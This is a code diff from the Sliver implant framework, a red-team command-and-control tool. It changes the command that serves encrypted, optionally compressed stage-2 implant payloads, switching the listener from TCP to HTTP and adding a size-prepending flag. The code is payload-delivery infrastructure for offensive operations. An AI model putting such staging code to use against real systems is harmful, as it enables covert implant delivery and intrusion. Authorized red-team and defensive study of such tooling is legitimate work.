@@ -1,4 +1,4 @@
-package jobs
+package http
 
 /*
 	Sliver Implant Framework
@@ -36,13 +36,14 @@ import (
 	"github.com/bishopfox/sliver/util/encoders"
 )
 
-// StageListenerCmd --url [tcp://ip:port | http://ip:port ] --profile name.
-func StageListenerCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
+// ServeStageCmd --url [tcp://ip:port | http://ip:port ] --profile name.
+func ServeStageCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
 	profileName, _ := cmd.Flags().GetString("profile")
 	listenerURL, _ := cmd.Flags().GetString("url")
 	aesEncryptKey, _ := cmd.Flags().GetString("aes-encrypt-key")
 	aesEncryptIv, _ := cmd.Flags().GetString("aes-encrypt-iv")
 	rc4EncryptKey, _ := cmd.Flags().GetString("rc4-encrypt-key")
+	prependSize, _ := cmd.Flags().GetBool("prepend-size")
 	compressF, _ := cmd.Flags().GetString("compress")
 	compress := strings.ToLower(compressF)
 
@@ -139,30 +140,24 @@ func StageListenerCmd(cmd *cobra.Command, con *console.SliverClient, args []stri
 		stage2 = util.RC4EncryptUnsafe(stage2, []byte(rc4EncryptKey))
 	}
 
-	switch stagingURL.Scheme {
-	case "tcp":
-		// Always prepend payload size for TCP stagers
+	if prependSize {
 		stage2 = prependPayloadSize(stage2)
-		ctrl := make(chan bool)
-		con.SpinUntil("Starting TCP staging listener...", ctrl)
-		stageListener, err := con.Rpc.StartTCPStagerListener(context.Background(), &clientpb.StagerListenerReq{
-			Protocol: clientpb.StageProtocol_TCP,
-			Data:     stage2,
-			Host:     stagingURL.Hostname(),
-			Port:     uint32(stagingPort),
-		})
-		ctrl <- true
-		<-ctrl
-		if err != nil {
-			con.PrintErrorf("Error starting TCP staging listener: %v\n", con.UnwrapServerErr(err))
-			return
-		}
-		con.PrintInfof("Job %d (tcp) started\n", stageListener.GetJobID())
-
-	default:
-		con.PrintErrorf("Unsupported staging protocol: %s\n", stagingURL.Scheme)
+	}
+	ctrl := make(chan bool)
+	con.SpinUntil("Starting HTTP staging listener...", ctrl)
+	stageListener, err := con.Rpc.StartTCPStagerListener(context.Background(), &clientpb.StagerListenerReq{
+		Protocol: clientpb.StageProtocol_HTTP,
+		Data:     stage2,
+		Host:     stagingURL.Hostname(),
+		Port:     uint32(stagingPort),
+	})
+	ctrl <- true
+	<-ctrl
+	if err != nil {
+		con.PrintErrorf("Error starting HTTP staging listener: %s\n", con.UnwrapServerErr(err))
 		return
 	}
+	con.PrintInfof("Job %d (http) started\n", stageListener.GetJobID())
 
 	if aesEncrypt {
 		con.PrintInfof("AES KEY: %v\n", aesEncryptKey)
